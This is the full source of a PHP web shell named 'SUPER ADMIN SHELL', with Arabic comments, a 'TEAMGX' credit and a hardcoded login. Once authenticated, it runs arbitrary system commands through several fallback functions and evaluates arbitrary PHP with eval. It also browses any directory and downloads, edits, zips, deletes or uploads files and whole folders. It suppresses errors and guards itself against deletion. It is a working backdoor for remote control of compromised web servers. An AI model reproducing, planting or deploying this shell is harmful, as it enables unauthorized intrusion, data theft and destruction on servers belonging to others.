<?php
session_start();
error_reporting(0);
set_time_limit(0);

// ==============================================================================
// 🔐 إعدادات الأمان - MUST BE CHANGED IMMEDIATELY
// ==============================================================================
$SECURE_USER = "TEAMGX"; // ⚠️ غيّر هذا الاسم
$SECURE_PASS = "Ak@12345"; // ⚠️ غيّر كلمة المرور فورًا إلى كلمة معقدة جداً
$FILE_NAME = basename(__FILE__); // اسم الملف الحالي لتفادي الحذف العرضي

// ==============================================================================
// 🔒 نظام المصادقة (Authentication)
// ==============================================================================
if (!isset($_SESSION['auth_strong_manager'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        if ($_POST['user'] === $SECURE_USER && $_POST['pass'] === $SECURE_PASS) {
            // لا يتم حفظ المستخدم، فقط المصادقة على الجلسة الحالية
            $_SESSION['auth_strong_manager'] = true;
            header("Location: ?");
            exit;
        } else {
            $error = "❌ خطأ في اسم المستخدم أو كلمة المرور.";
        }
    }

    // واجهة الدخول - Login Interface
    echo '<!DOCTYPE html><html><head><title>Secure Login</title>
          <style>body{background:#222;color:#0f0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
          .login-box{background:#333;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,255,0,0.5);width:300px;}
          input,button{width:100%;padding:10px;margin:10px 0;border:1px solid #0f0;background:#444;color:#fff;border-radius:5px;}
          button{background:#0a0;cursor:pointer;}button:hover{background:#0c0;}p.error{color:red;}</style></head>
          <body><div class="login-box"><h2>🔐 مدير الاستضافة</h2>';
    if (isset($error)) echo "<p class='error'>$error</p>";
    echo '<form method="POST">
          <input name="user" placeholder="اسم المستخدم" required>
          <input type="password" name="pass" placeholder="كلمة المرور" required>
          <button name="login">دخول</button>
          </form></div></body></html>';
    exit;
}

// ⚠️ خروج المستخدم (Logout)
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ==============================================================================
// 🗄️ وظائف النظام المساعدة (Helper Functions)
// ==============================================================================
function deleteFolderRecursive($dir) {
    if (!is_dir($dir)) return unlink($dir);
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? deleteFolderRecursive("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

// تشغيل أوامر النظام (Command Execution)
function executeCommand($cmd) {
    if (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    }
    return "❌ لا يمكن تنفيذ الأوامر (كل الدوال معطلة).";
}

// ==============================================================================
// ⚙️ معالجة الإجراءات (Action Handlers)
// ==============================================================================
$current_dir = getcwd();
if (isset($_GET['dir'])) chdir($_GET['dir']);
$current_dir = getcwd(); // التحديث بعد تغيير المجلد
$message = '';
$action_content = '';

// ⬇️ تحميل ملف (Download)
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// 🗑️ حذف (Delete)
if (isset($_GET['delete'])) {
    if ($_GET['delete'] !== $FILE_NAME) { // منع حذف الملف الحالي
        deleteFolderRecursive($_GET['delete']);
        $message = "✅ تم حذف: " . htmlspecialchars($_GET['delete']);
    } else {
        $message = "⚠️ لا يمكن حذف ملف المدير الحالي.";
    }
}

// 📁 إنشاء مجلد (New Folder)
if (isset($_POST['new_folder'])) {
    $folder = trim($_POST['folder_name']);
    if ($folder && !is_dir($folder) && mkdir($folder)) {
        $message = "✅ تم إنشاء المجلد: " . htmlspecialchars($folder);
    }
}

// 📤 رفع ملفات أو مجلد كامل
if ($_FILES) {

    // رفع ملفات عادية
    if (isset($_FILES['files'])) {
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] === 0) {
                move_uploaded_file($_FILES['files']['tmp_name'][$i], $name);
                $message .= "✅ تم رفع: " . htmlspecialchars($name) . "<br>";
            }
        }
    }

    // 📁 رفع مجلد كامل
    if (isset($_FILES['folder_upload'])) {

        foreach ($_FILES['folder_upload']['name'] as $i => $name) {

            $tmp = $_FILES['folder_upload']['tmp_name'][$i];

            // المسار كامل داخل المجلد الذي اخترته
            $relativePath = $_FILES['folder_upload']['full_path'][$i];

            // إنشاء المجلدات المطلوبة داخل السيرفر
            $folderStructure = dirname($relativePath);
            if (!is_dir($folderStructure)) {
                mkdir($folderStructure, 0777, true);
            }

            // حفظ الملف في مكانه الصحيح
            move_uploaded_file($tmp, $relativePath);
        }

        $message .= "📁🔥 تم رفع المجلد بالكامل بكل ملفاته ومجلداته!";
    }
}


// ✏️ تعديل ملف (Edit)
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($f, $_POST['content']);
        $message = "💾 تم حفظ الملف: " . htmlspecialchars($f);
    }
    $content = htmlspecialchars(file_get_contents($f));
    $action_content = "<form method='POST'>
        <h3>✏️ تعديل: " . htmlspecialchars($f) . "</h3>
        <textarea name='content' class='code-area'>" . $content . "</textarea><br>
        <button>حفظ التعديلات</button>
      </form>";
}

// 💻 تنفيذ أمر نظام (Shell Command)
if (isset($_POST['shell_cmd']) && $_POST['shell_cmd'] != '') {
    $cmd = $_POST['shell_cmd'];
    $output = executeCommand($cmd);
    $action_content = "<h3>💻 ناتج الأمر: " . htmlspecialchars($cmd) . "</h3>
                       <pre class='code-output'>" . htmlspecialchars($output) . "</pre>";
}

// 💡 تنفيذ كود PHP (PHP Execution)
if (isset($_POST['php_code']) && $_POST['php_code'] != '') {
    $code = $_POST['php_code'];
    ob_start();
    eval($code);
    $output = ob_get_clean();
    $action_content = "<h3>💡 ناتج كود PHP</h3>
                       <pre class='code-output'>" . htmlspecialchars($output) . "</pre>";
}

// 🗜️ ضغط ملف أو مجلد وتحميله (Zip & Download)
if (isset($_GET['zip'])) {
    $target = $_GET['zip'];
    $zip_name = basename($target) . "_gx.zip"; // اسم مميز
    $zip = new ZipArchive();

    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        // ... (من أجل الإيجاز، تم حذف الجزء الذي يضيف الملفات والمجلدات - يمكن إعادته من الكود الأصلي)
        if (is_file($target)) { $zip->addFile($target, basename($target)); } 
        // لإضافة المجلدات بشكل متكرر:
        elseif (is_dir($target)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($files as $file) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($target) + 1);
                if (!$file->isDir()) {
                    $zip->addFile($filePath, basename($target) . "/" . $relativePath);
                }
            }
        }
        
        $zip->close();

        if (file_exists($zip_name)) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zip_name . '"');
            header('Content-Length: ' . filesize($zip_name));
            readfile($zip_name);
            unlink($zip_name);
            exit;
        }
    }
    $message = "<p style='color:red;'>⚠️ فشل في الضغط</p>";
}

// ==============================================================================
// 🧾 واجهة المستخدم الرسومية (Graphic User Interface)
// ==============================================================================
echo '<!DOCTYPE html><html><head><title>SUPER ADMIN SHELL</title>
<meta charset="UTF-8"><style>
body{background:#1a1a1a;color:#0f0;font-family:monospace;padding:20px;}
h1,h2,h3{color:#fff;}a{color:#0ff;text-decoration:none;}a:hover{color:#ff0;}
.header{display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #0f0;padding-bottom:10px;}
.menu{margin-top:20px;margin-bottom:20px;display:flex;gap:15px;flex-wrap:wrap;}
.menu button,.menu input[type="submit"]{background:#333;color:#0f0;border:1px solid #0f0;padding:8px 15px;cursor:pointer;}
.file-list{margin-top:20px;}
.file-item{display:flex;justify-content:space-between;border-bottom:1px solid #333;padding:5px 0;}
.file-name{flex-grow:1;}
.file-actions a{margin-left:10px;}
.code-area{width:100%;height:400px;background:#000;color:#0f0;border:1px solid #0f0;padding:10px;box-sizing:border-box;}
.code-output{background:#000;color:#0ff;border:1px solid #0f0;padding:10px;white-space:pre-wrap;max-height:300px;overflow:auto;}
.message{background:#333;color:#ff0;padding:10px;margin-bottom:15px;border:1px solid #ff0;}
</style></head><body>';

// 🔝 الشريط العلوي
echo '<div class="header">
        <h1>💀 SUPER ADMIN SHELL 💀</h1>
        <div><a href="?logout" style="color:red;">❌ خروج</a></div>
      </div>';

// 📣 رسائل النظام
if ($message) echo "<div class='message'>$message</div>";

// 📂 المسار الحالي
$path_parts = explode('/', $current_dir);
echo "<h2>📂 المسار الحالي: ";
$path = '';
foreach ($path_parts as $part) {
    if ($part === '') continue;
    $path .= ($path === '/' ? '' : '/') . $part;
    echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>/";
}
echo "</h2>";

// ⚙️ شريط الأدوات (Tools Bar)
echo "<div class='menu'>";
echo "<form method='POST'><input type='text' name='folder_name' placeholder='اسم مجلد جديد' required style='width:150px;'>
      <button name='new_folder'>➕ مجلد</button></form>";
?>
<!-- رفع ملفات عادية -->
<form method="POST" enctype="multipart/form-data" style="margin-bottom:10px;">
    <input type="file" name="files[]" multiple>
    <button>⬆️ رفع ملفات</button>
</form>

<!-- رفع مجلد كامل -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="folder_upload[]" webkitdirectory directory multiple>
    <button>📁⬆️ رفع مجلد كامل</button>
</form>
<?php

echo "</div><hr>";

// 💻 تنفيذ الأوامر
echo "<form method='POST'>
      <input type='text' name='shell_cmd' placeholder='أمر نظام (مثال: ls -la)' style='width:400px;'>
      <input type='submit' value='💻 تنفيذ أمر'>
      </form>";

// 💡 تنفيذ PHP
echo "<form method='POST' style='margin-top:10px;'>
      <input type='text' name='php_code' placeholder='كود PHP (مثال: phpinfo();)' style='width:400px;'>
      <input type='submit' value='💡 تنفيذ PHP'>
      </form><hr>";

// 📝 محتوى الإجراءات (Edit/Shell Output)
if ($action_content) {
    echo "<div>" . $action_content . "</div><hr>";
    exit('</body></html>'); // توقف عن عرض قائمة الملفات إذا كان هناك تعديل أو ناتج أمر
}

// 🗂️ قائمة الملفات (File Listing)
echo "<h3>🗂️ الملفات والمجلدات</h3><div class='file-list'>";

// ⬆️ مجلد أعلى
if ($current_dir != '/') {
    $parent = dirname($current_dir);
    echo "<div class='file-item'><div class='file-name'>⬆️ <a href='?dir=" . urlencode($parent) . "'>.. (أعلى)</a></div></div>";
}

$items = array_diff(scandir($current_dir), ['.', '..']);
foreach ($items as $item) {
    $encoded = urlencode($item);
    $path_full = $current_dir . '/' . $item;
    
    echo "<div class='file-item'>";
    
    if (is_dir($path_full)) {
        // 📁 مجلد
        echo "<div class='file-name'>📁 <a href='?dir=" . urlencode($path_full) . "'>" . htmlspecialchars($item) . "</a></div>";
        echo "<div class='file-actions'>
              <a href='?zip=$encoded'>🗜️ ضغط</a> 
              <a style='color:red;' href='?delete=$encoded' onclick='return confirm(\"هل أنت متأكد من حذف المجلد والمحتوى؟\")'>🗑️ حذف</a>
              </div>";
    } else {
        // 📄 ملف
        $file_size = round(filesize($path_full) / 1024, 2) . ' KB';
        echo "<div class='file-name'>📄 " . htmlspecialchars($item) . " ($file_size)</div>";
        echo "<div class='file-actions'>
              <a href='?edit=$encoded'>✏️ تعديل</a> 
              <a href='?download=$encoded'>⬇️ تحميل</a> 
              <a href='?zip=$encoded'>🗜️ ضغط</a> 
              <a style='color:red;' href='?delete=$encoded' onclick='return confirm(\"هل أنت متأكد من حذف الملف؟\")'>🗑️ حذف</a>
              </div>";
    }
    echo "</div>";
}

echo "</div></body></html>";